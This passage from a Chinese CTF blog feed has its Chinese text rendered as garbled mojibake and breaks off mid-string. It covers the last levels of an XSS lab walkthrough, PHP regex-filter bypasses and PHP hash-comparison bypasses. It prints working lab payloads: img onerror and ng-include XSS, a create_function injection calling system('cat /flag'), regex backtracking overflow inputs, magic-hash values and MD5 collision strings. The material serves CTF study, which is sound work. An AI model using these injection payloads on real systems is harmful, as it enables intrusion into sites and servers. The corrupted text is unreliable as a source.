å«æœ‰æ¶æ„ä¿¡æ¯çš„å›¾ç‰‡çš„æ—¶å€™ï¼Œå°±å¯ä»¥è§¦å‘payload</p><img src="/2023/01/25/XSS/1.png" class=""><p>ä¾‹å¦‚ç½‘ç«™<a href="https://exifdata.com/">EXIF Data Viewer</a></p><p>14å…³ç”¨çš„ç½‘ç«™æ˜¯<a href="http://ww1.exifviewer.org/">http://ww1.exifviewer.org/</a> ,æ²¡æœ‰æ¢¯å­æ˜¯è®¿é—®ä¸äº†çš„ï¼Œå¯ä»¥æ¢æˆ<a href="https://exifdata.com/">EXIF Data Viewer</a>ï¼Œ</p><p>è¿™æ ·å°±å¯ä»¥exif xss</p><p>å°†ä¸Šé¢çš„å›¾ç‰‡ä¸Šä¼ å³å¯è§¦å‘</p><h4 id="xss-lablevel15php"><a class="markdownIt-Anchor" href="#xss-lablevel15php"></a> xss-lab/level15.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ³¨å…¥ç‚¹åœ¨å‚æ•°src</p><p>ng-include å…¶ä½œç”¨ç›¸å½“äºphpçš„includeå‡½æ•°ã€‚</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">ç‰¹åˆ«å€¼å¾—æ³¨æ„çš„å‡ ç‚¹å¦‚ä¸‹ï¼š<br> <br><span class="hljs-number">1.</span>ng-<span class="hljs-meta"><span class="hljs-keyword">include</span>,å¦‚æœå•çº¯æŒ‡å®šåœ°å€ï¼Œå¿…é¡»è¦åŠ å¼•å·</span><br><span class="hljs-meta"> </span><br><span class="hljs-meta">2.ng-<span class="hljs-keyword">include</span>,åŠ è½½å¤–éƒ¨htmlï¼Œscriptæ ‡ç­¾ä¸­çš„å†…å®¹ä¸æ‰§è¡Œ</span><br><span class="hljs-meta"> </span><br><span class="hljs-meta">3.ng-<span class="hljs-keyword">include</span>,åŠ è½½å¤–éƒ¨htmlä¸­å«æœ‰styleæ ‡ç­¾æ ·å¼å¯ä»¥è¯†åˆ«</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">src=&#x27;level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">2</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><h4 id="xss-lablevel16php"><a class="markdownIt-Anchor" href="#xss-lablevel16php"></a> xss-lab/level16.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str5</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img src<span class="hljs-operator">=</span><span class="hljs-number">2</span> onerror<span class="hljs-operator">=</span>alert()&gt; åŸºæœ¬ä¸å«ä»¥ä¸Šè¿‡æ»¤çš„å…³é”®å­—<br>urlç©ºæ ¼å¯ä»¥ç”¨%<span class="hljs-number">0</span>aä»£æ›¿<br><span class="hljs-attribute">keyword</span><span class="hljs-operator">=</span>&lt;img%<span class="hljs-number">0</span>asrc<span class="hljs-operator">=</span><span class="hljs-number">2</span>%<span class="hljs-number">0</span>aonerror<span class="hljs-operator">=</span>alert()&gt;<br></code></pre></td></tr></table></figure><h4 id="xss-lablevel17php"><a class="markdownIt-Anchor" href="#xss-lablevel17php"></a> xss-lab/level17.php</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level17<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">xsf01.swf?a</span>=<span class="hljs-string">b</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æˆåŠŸåï¼Œ<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>ç‚¹æˆ‘è¿›å…¥ä¸‹ä¸€å…³<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;embed&gt;</code>æ ‡ç­¾å°±æ˜¯å¼•å…¥ä¸€ä¸ª<code>swfæ–‡ä»¶</code>åˆ°æµè§ˆå™¨ç«¯ï¼Œå¹¶ä¸”å®ƒçš„srcå±æ€§å€¼æ²¡æœ‰æ·»åŠ å¼•å·ï¼Œæ‰€ä»¥ä¸ç”¨é—­åˆï¼Œå¯èƒ½å¯ä»¥åˆ©ç”¨</p><p>ä¸çŸ¥ä¸ºä½•swfæ–‡ä»¶å¹¶æ²¡æœ‰å¼•å…¥</p><p>æ²¡æœ‰å¼•å·é—­åˆï¼ŒæŒ‰é“ç†æ˜¯åœ¨ç¬¬äºŒä¸ªå‚æ•°å‰é¢åŠ ä¸€ä¸ªç©ºæ ¼å’Œsrc åˆ†éš”å¼€</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=a&amp;arg02= <span class="hljs-attribute">onmouseover</span>=alert(1)<br></code></pre></td></tr></table></figure><p>åº”è¯¥å¯¹çš„ï¼Œä½†æ˜¯ç»“æœæ²¡æœ‰alert()</p><h4 id="xss-lablevel18php"><a class="markdownIt-Anchor" href="#xss-lablevel18php"></a> xss-lab/level18.php</h4><p>åªæ˜¯æ¢äº†ä¸ªæ’ä»¶ï¼Œå…¶ä»–åŒ17å…³</p><h4 id="xss-lablevel19php"><a class="markdownIt-Anchor" href="#xss-lablevel19php"></a> xss-lab/level19.php</h4><h4 id="xss-lablevel20php"><a class="markdownIt-Anchor" href="#xss-lablevel20php"></a> xss-lab/level20.php</h4><p>19,20æœ‰åŒå¼•å·é—­åˆï¼Œè€Œä¸”ç”¨äº†htmlspecialchars(),å¯¹å­—ç¬¦è¿›è¡Œå®ä½“è½¬ä¹‰ï¼Œè¿˜æ˜¯flashæ’ä»¶çš„xssï¼Œå¤ªå¤æ‚ä¸ä¼š</p><h3 id="ä¸€äº›xssæŠ€å·§"><a class="markdownIt-Anchor" href="#ä¸€äº›xssæŠ€å·§"></a> ä¸€äº›XSSæŠ€å·§</h3><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>è‹¥&lt;&gt;è¢«è½¬ä¹‰ï¼Œåˆ™å¯»æ‰¾ä¸ºè¢«è½¬ä¹‰çš„æ³¨å…¥ç‚¹</p><p>éƒ½è¢«è½¬ä¹‰ï¼Œå¯ä»¥ä½¿ç”¨onfocusé…åˆjavascript ä¼ªåè®®æ¥æ‰§è¡Œjavascript ä»£ç <code>onfocus=javascript:alert()</code>æˆ–è€…<code>onmouseover='alert()'</code></p><p>on è¢«è½¬ä¹‰ï¼Œå¯ä»¥å¤§å†™ç»•è¿‡On,æˆ–å€ŸåŠ©&lt;a&gt;æ ‡ç­¾<code>&lt;a href=javascript:alert()&gt;hhh&lt;/a&gt;</code></p><p>ä»¥ä¸Šè¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨<code>&lt;img src=2 onerror=alert()&gt;</code></p><p>hrefæœ‰å±æ€§è‡ªåŠ¨Unicodeè§£ç ,å¦‚æœæ³¨å…¥ç‚¹å†hrefä¸­ï¼Œå¯ä»¥è¿›è¡Œunicodeç¼–ç </p><p>è¦æ±‚å«æœ‰æŸäº›å­—ç¬¦ï¼Œå¯ä»¥å°†å­—ç¬¦æ”¾åœ¨alerté‡Œè¾¹</p><p>exif xss ä¸€èˆ¬å°±æ˜¯å°†æ–‡ä»¶è¯¦ç»†ä¿¡æ¯ä¿®æ”¹æˆxssè¯­å¥ä¸Šä¼ </p><p>ng-include å¯ä»¥é…åˆscr onerror <code>'level1.php?name=&lt;img src=2 onerror=alert()&gt;'</code></p><h3 id="å‚è€ƒèµ„æ–™"><a class="markdownIt-Anchor" href="#å‚è€ƒèµ„æ–™"></a> <em>å‚è€ƒèµ„æ–™</em></h3><p><em><a href="https://ctf-wiki.org/web/xss/">https://ctf-wiki.org/web/xss/</a></em></p><p><em><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></em></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ­£åˆ™ç»•è¿‡</title>
    <link href="/2023/01/20/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"/>
    <url>/2023/01/20/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h3 id="1æ¢è¡Œç¬¦ç»•è¿‡0a"><a class="markdownIt-Anchor" href="#1æ¢è¡Œç¬¦ç»•è¿‡0a"></a> 1.æ¢è¡Œç¬¦ç»•è¿‡(%0a)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^flag$/i&#x27;</span>, <span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>%0a urlè§£æä¸ºæ¢è¡Œç¬¦ï¼Œ åœ¨windowå’Œlinuxç³»ç»Ÿä¸‹å¯ä»¥å½“æˆç©ºç™½å­—ç¬¦å¤„ç†</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">c</span><span class="hljs-operator">=</span>flag%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><h3 id="2æ•°ç»„ç»•è¿‡"><a class="markdownIt-Anchor" href="#2æ•°ç»„ç»•è¿‡"></a> 2.æ•°ç»„ç»•è¿‡</h3><p>preg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„å‚æ•°æ˜¯æ•°ç»„æ—¶ä¼šè¿”å›false</p><h3 id="35cç»•è¿‡"><a class="markdownIt-Anchor" href="#35cç»•è¿‡"></a> 3.(\)%5cç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$action</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]: <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-variable">$arg</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;arg&#x27;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;arg&#x27;</span>]: <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="hljs-variable">$action</span>)) &#123;<br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>&#125;<span class="hljs-keyword">else</span> &#123;<br><br><span class="hljs-variable">$action</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/i</span>ä¸åŒºåˆ†å¤§å°å†™<br><br><span class="hljs-string">/s</span>åŒ¹é…ä»»ä½•ä¸å¯è§å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ï¼Œç­‰ä»·äº[fnrtv]<br><br><span class="hljs-string">/D</span>å¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ;<br><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">action<span class="hljs-operator">=</span>a<span class="hljs-operator">=</span>\create_function&amp;arg<span class="hljs-operator">=</span>&#125;system(<span class="hljs-variable">%27</span>cat<span class="hljs-variable">%20</span>/flag<span class="hljs-variable">%27</span>)<span class="hljs-comment">;/*</span><br></code></pre></td></tr></table></figure><h3 id="4æ­£åˆ™å¤§å›æº¯"><a class="markdownIt-Anchor" href="#4æ­£åˆ™å¤§å›æº¯"></a> 4.æ­£åˆ™å¤§å›æº¯</h3><p>pre_match æ­£åˆ™å›æº¯çš„æœ€å¤§æ¬¡æ•°ä¸ºä¸€ç™¾ä¸‡æ¬¡ï¼Œè¶…è¿‡åˆ™è¿”å›false</p><p>ã€2022 xsctf væˆ‘50ã€‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$input</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$input</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)==<span class="hljs-string">&quot;vme50&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$input</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) )&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$input</span>==<span class="hljs-string">&quot;vme50!&quot;</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Speak a little louder,I can&#x27;t hear you!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/vme50.+?!/is&#x27;</span>,<span class="hljs-variable">$input</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xing bu xing a.Speak much louder!&quot;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Bie lai zhan bian!!!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>vme50å¼€å¤´ï¼Œåé¢ä¸èƒ½æœ‰å…¶ä»–ï¼Œåˆè¦æ˜¯vme50!ï¼Œé‚£ä¹ˆåœ¨ä¸­é—´åŠ ä¸Šä¸€ç™¾ä¸‡ä¸ªâ€™aâ€™,æ˜¯preg_matchè¿”å›false</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">input</span>=vme50a....a!  (ä¸­é—´è¡¨ç¤ºä¸€ç™¾ä¸‡ä¸ªa)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hashç»•è¿‡</title>
    <link href="/2023/01/20/hash%E7%BB%95%E8%BF%87/"/>
    <url>/2023/01/20/hash%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>åšé¢˜é‡åˆ°äº†hashå‡½æ•°çš„ç»•è¿‡é—®é¢˜ï¼Œä¹‹å‰æ€»ç»“å¾—ä¸å…¨ï¼Œé‡æ–°æ•´ç†ä¸€ä¸‹</p><h3 id="å¼±ç±»å‹ç»•è¿‡"><a class="markdownIt-Anchor" href="#å¼±ç±»å‹ç»•è¿‡"></a> å¼±ç±»å‹ç»•è¿‡</h3><h4 id="md5"><a class="markdownIt-Anchor" href="#md5"></a> md5</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>!=<span class="hljs-variable">$b</span>&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)<br></code></pre></td></tr></table></figure><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œå®ƒæŠŠæ¯ä¸ªä»¥â€˜0Eâ€™å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥åªè¦aï¼Œbçš„md5çš„å€¼ä»¥0Eå¼€å¤´å³å¯ï¼Œå¾—åˆ°çš„md5çš„å€¼å°±éƒ½æ˜¯0</p><p>ä¾‹å¦‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=QNKCDZO&amp;b=<span class="hljs-number">240610708</span><br></code></pre></td></tr></table></figure><p>ä¸€äº›å¸¸è§çš„md5çš„å€¼ä»¥0eå¼€å¤´çš„ä¾‹å­</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dns">QNKCDZO<br><span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br> <br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br>  <br>s155964671a<br><span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span><br>  <br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br>  <br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br>  <br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br>  <br>s1091221200a<br><span class="hljs-number">0</span>e9406242178565615578<span class="hljs-number">16327384675</span><br>  <br>s1885207154a<br><span class="hljs-number">0</span>e5093672134182067008<span class="hljs-number">42008763514</span><br><br></code></pre></td></tr></table></figure><h4 id="sha1"><a class="markdownIt-Anchor" href="#sha1"></a> sha1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>!=<span class="hljs-variable">$b</span>&amp;&amp;<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$a</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$b</span>)<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=aaroZmOk&amp;b=aaK1STfY<br></code></pre></td></tr></table></figure><h3 id="å¼ºæ¯”è¾ƒ"><a class="markdownIt-Anchor" href="#å¼ºæ¯”è¾ƒ"></a> å¼ºæ¯”è¾ƒ</h3><h4 id="md5-2"><a class="markdownIt-Anchor" href="#md5-2"></a> md5</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>!=<span class="hljs-variable">$b</span>&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)<br></code></pre></td></tr></table></figure><p>1.æ•°ç»„ç»•è¿‡</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">?a<span class="hljs-comment">[]</span>=1a&amp;b<span class="hljs-comment">[]</span>=2<br></code></pre></td></tr></table></figure><p>2.å¦‚æœè¦æ±‚aï¼Œbæ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™è¿›è¡Œhashç¢°æ’</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br>b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span 